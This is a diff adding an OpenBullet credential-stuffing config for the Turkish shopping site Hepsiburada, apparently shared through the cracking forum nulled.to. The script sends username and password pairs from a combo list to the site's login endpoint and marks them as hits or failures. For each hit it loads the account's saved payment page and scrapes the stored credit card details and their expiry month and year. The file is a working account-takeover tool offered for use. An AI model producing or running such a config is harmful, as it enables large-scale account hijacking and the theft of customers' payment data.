@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "Hepsiburada",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-29T19:22:33.1390674+02:00",
+  "AdditionalInfo": "",
+  "Author": "Acemy#7578",
+  "Version": "1.1.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.hepsiburada.com/uyelik/Customer/Login" 
+  CONTENT "em=<USER>&p=<PASS>&returnUrl=%2F&acn=&__RequestVerificationToken=jCTkGbNXzdB6kxxFhY8tZwSKzmGVMWgEamNoYcXjQFxvT1TlnkOu3vwkMe4WzjwnLcWG83xVZAGZt-9WOEYFlx2dWkLPmjysM6xTpG5_vvFVdOzpJcTy_0sH7_mcKY5QElTz2g2" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.hepsiburada.com" 
+  HEADER "Origin: https://www.hepsiburada.com" 
+  HEADER "Referer: https://www.hepsiburada.com/uyelik/giris?ReturnUrl=%2F" 
+  HEADER "requestverificationtoken: 1n2x_Gq-um4cY5hy78vFGGuauvoQlVuNCxcgxl98s71ROyYz8n-gDlcQF8naDFfPpRts9zn6y87TUnEpD6MkuDlCtCU1:HC7KSjSBamUWbSGbUWHg3eVvjrY3JxbH79CMRdeKgFzulMNrTkt0u8x99TK4_lwJCzP3rGm8uUz5ZgAVqlAjiuYXkgJybkatjwkAs5UlhtG3wysHqAngBOK4QusALtwFPaUl7A2" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpReques" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\": true" 
+  KEYCHAIN Failure OR 
+    KEY "success\": false" 
+
+REQUEST GET "https://www.hepsiburada.com/ayagina-gelsin/hizli-odeme-tercihlerim" 
+  
+  HEADER "Host: www.hepsiburada.com" 
+  HEADER "Referer: https://www.nulled.to/index.php?app=members&module=messaging&section=view&do=showConversation&topicID=948510&st=0" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
+
+#PARSE_CREDIT PARSE "<SOURCE>" LR "<label>Kredi Kartı</label>" "</p>" Recursive=TRUE -> CAP "CREDIT" 
+
+#PARSE_MONTH PARSE "<SOURCE>" LR "\"expire-date-month\" data-width=\"100%\" data-bind=\"value: " ", event: { change: selectedExpireMonth " Recursive=TRUE -> CAP "EXP MONTH" 
+
+#PARSE_YEAR PARSE "<SOURCE>" LR "name=\"expire-date-year\" data-width=\"100%\" data-bind=\"value: " ", event: { change: selectedExpireYear " Recursive=TRUE -> CAP "EXP YEAR" 
+
